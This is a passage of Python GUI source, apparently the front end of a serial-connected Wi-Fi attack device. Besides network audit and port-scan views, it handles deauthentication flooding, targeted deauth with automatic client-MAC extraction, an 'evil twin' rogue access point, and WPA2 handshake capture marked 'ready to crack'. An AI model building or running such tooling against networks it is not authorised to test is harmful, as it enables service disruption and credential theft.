                    text_color=grade_colors.get(sec["grade"], "#ffffff"))
                self._grade_label.configure(
                    text=f"Score {sec['score']}/100 — {sec['label']}",
                    text_color=grade_colors.get(sec["grade"], "#ffffff"))
                self.audit_box.insert("end",
                    f"\n{'='*50}\n"
                    f"  AUDIT COMPLETE\n"
                    f"  Security Grade : {sec['grade']}  ({sec['score']}/100 — {sec['label']})\n"
                    f"  Open ports     : {n_ports}   HIGH risk: {high}\n"
                    f"  Live hosts     : {n_hosts}\n"
                    f"  → Select a device on the right to scan its ports\n"
                    f"  → Click Export PDF to generate the report\n"
                    f"{'='*50}\n\n")
                self.audit_box.see("end")
                self.audit_status.configure(
                    text=f"Done — Grade {sec['grade']} | {n_ports} ports, {n_hosts} hosts",
                    text_color=grade_colors.get(sec["grade"], COLORS["green"]))
                self.kc_update("AUDIT", "done", f"Grade {sec['grade']} | {n_ports} ports")

            # ── AUDIT_DISCONNECTED ──
            elif data == "RES:AUDIT_DISCONNECTED":
                self.audit_status.configure(text="Connection Failed / Disconnected", text_color="#ff3333")
                self.audit_box.insert("end", 
                    f"\n{'='*50}\n"
                    f"  [!] AUDIT FAILED: CONNECTION DISCONNECTED / REJECTED\n"
                    f"  - Verify your WPA2 password is correct.\n"
                    f"  - Check if the target AP is in range.\n"
                    f"  - Ensure WPS is disabled and the AP accepts connections.\n"
                    f"{'='*50}\n\n")
                self.audit_box.see("end")
                self.kc_update("AUDIT", "fail", "Disconnected")

            # ── DEVICE_PORT:ip:port:OPEN:service:banner ──
            elif data.startswith("RES:DEVICE_PORT:"):
                p = data[16:].split(":")
                if len(p) >= 4 and p[2] == "OPEN":
                    port_n  = int(p[1]) if p[1].isdigit() else 0
                    service = p[3] if len(p) > 3 else "?"
                    banner  = ":".join(p[4:]).strip() if len(p) > 4 else ""
                    risk    = ("HIGH"   if port_n in {21,23,161,1900,7547,445,3389} else
                               "MEDIUM" if port_n in {22,80,3306,8080,8443,9090} else "LOW")
                    flag    = "[H]" if risk=="HIGH" else "[M]" if risk=="MEDIUM" else "[L]"
                    self._device_box.insert("end",
                        f"  {flag} {port_n:<6} {service:<14} {banner[:35]}\n")
                    self._device_box.see("end")

            # ── DEVICE_SCAN_DONE ──
            elif data.startswith("RES:DEVICE_SCAN_DONE:"):
                ip = data[21:].strip()
                self._device_box.insert("end", f"\n[✓] Scan complete: {ip}\n")
                self._device_box.see("end")
                self._device_status.configure(
                    text=f"Scanned: {ip}", text_color=COLORS["green"])

            # ── DEVICE_SCAN_START ──
            elif data.startswith("RES:DEVICE_SCAN_START:"):
                ip = data[22:].strip()
                self._device_box.insert("end", f"[*] Port scanning {ip}...\n")
                self._device_box.see("end")

        elif data.startswith("RES:DEAUTH"):
            self.deauth_log.insert("end", f"{data}\n"); self.deauth_log.see("end")
            if "DONE" in data:
                self.deauth_status.configure(text="Burst complete ✓", text_color=COLORS["green"])
                self.kc_update("DEAUTH", "done", "Burst complete")
            elif "CONTINUOUS_START" in data:
                self.deauth_cont_status.configure(text="🔴 FLOODING ACTIVE", text_color=COLORS["red"])
                self.kc_update("DEAUTH", "running", "Continuous flooding")
            elif "CONTINUOUS_STOP" in data or "STOPPING" in data:
                self._deauth_cont_running = False
                self.deauth_cont_btn.configure(text="▶ Start Continuous", fg_color=COLORS["orange"])
                self.deauth_cont_status.configure(text="Stopped", text_color=COLORS["dim"])
                self.kc_update("DEAUTH", "done", "Continuous stopped")
        elif data.startswith("RES:DEAUTH_TARGETED:"):
            # RES:DEAUTH_TARGETED:STARTING:aa:bb:cc:dd:ee:ff  or  RES:DEAUTH_TARGETED:DONE
            self.deauth_log.insert("end", f"{data}\n"); self.deauth_log.see("end")
            if "DONE" in data:
                self._targeted_status.configure(text="Targeted burst done ✓", text_color=COLORS["green"])
                self.kc_update("DEAUTH", "done", "Targeted burst complete")
        elif data.startswith("RES:ROGUE"):
            self.rogue_log.insert("end", f"{data}\n"); self.rogue_log.see("end")
            if "STARTED" in data:
                self.kc_update("ROGUE", "done", data)
            elif "STOPPED" in data:
                self.kc_update("ROGUE", "done", "Evil twin stopped")
        else:
            self.log(data)

    def _handle_raw(self, hex_data):
        if not SCAPY_AVAILABLE or not self.pcap_writer:
            return
        try:
            raw = bytes.fromhex(hex_data)
            self.pcap_writer.write(raw)
            self.pkt_count += 1
            is_eapol = "888e" in hex_data.lower()
            if is_eapol and not self.handshake:
                self.handshake = True
                self.pcap_lbl.configure(
                    text=f"PCAP: {self.pkt_count} frames  ★ HANDSHAKE CAPTURED!",
                    text_color=COLORS["green"])
                self.crack_box.insert("end","[!!!] EAPOL Handshake in PCAP — ready to crack!\n")
                self.crack_box.see("end")
                self.kc_update("CAPTURE", "done", f"EAPOL at frame {self.pkt_count}")
            else:
                self.pcap_lbl.configure(text=f"PCAP: {self.pkt_count} frames captured")

            # ── Auto-extract client MAC from 802.11 frame header ──
            # For Data frames from DS (fromDS=1): Addr1=DA(client) at byte 4
            # We look at frame control byte 1 (fc1) bits 0-1:
            #   00=IBSS, 01=ToDS, 10=FromDS, 11=WDS
            # EAPOL Msg1 comes FromDS → client MAC is at bytes 4-9
            if is_eapol and len(raw) >= 10:
                fc1 = raw[1]
                ds = fc1 & 0x03
                if ds == 0x02:  # FromDS: Addr1=client, Addr2=AP, Addr3=BSSID
                    client_mac = ":".join(f"{b:02x}" for b in raw[4:10])
                elif ds == 0x01:  # ToDS: Addr1=AP, Addr2=client, Addr3=BSSID
                    client_mac = ":".join(f"{b:02x}" for b in raw[10:16])
                else:
                    client_mac = None
                # Auto-fill only if it looks like a real unicast MAC (not broadcast)
                if client_mac and not client_mac.startswith("ff:ff"):
                    # Update the targeted deauth field if it's empty
                    if hasattr(self, '_client_mac_var') and not self._client_mac_var.get():
                        self._client_mac_var.set(client_mac)
                        self.deauth_log.insert("end",
                            f"[+] Client MAC auto-detected: {client_mac}\n"
                            f"    → Ready for targeted deauth!\n")
                        self.deauth_log.see("end")

            self.pcap_lbl.configure(
                text=f"PCAP: {self.pkt_count} frames{'  ★ HANDSHAKE' if self.handshake else ''}",
                text_color=COLORS["green"] if self.handshake else COLORS["yellow"])
        except Exception:
            pass

    def _update_all_dropdowns(self):
        opts = list(self.networks.keys())
        for m in [self.tgt_menu, self.tgt_menu2, self.tgt_menu3]:
            m.configure(values=opts)

    def _set_target_all(self, ssid):
        for v in [self.tgt_var, self.tgt_var2, self.tgt_var3]:
            v.set(ssid)
        self.kc_update("TARGET", "done", f"Target: {ssid}")
        self.log(f"[+] Target set to: {ssid}")

    def log(self, msg):
        self.crack_box.insert("end", msg + "\n")
        self.crack_box.see("end")

    def on_close(self):
        try:
            self.serial.send_cmd("CMD:SNIFF_STOP")
        except Exception:
            pass
        try:
            self.serial.disconnect()
        except Exception:
            pass
        self.destroy()


if __name__ == "__main__":
    app = App()
    app.protocol("WM_DELETE_WINDOW", app.on_close)
    app.mainloop()
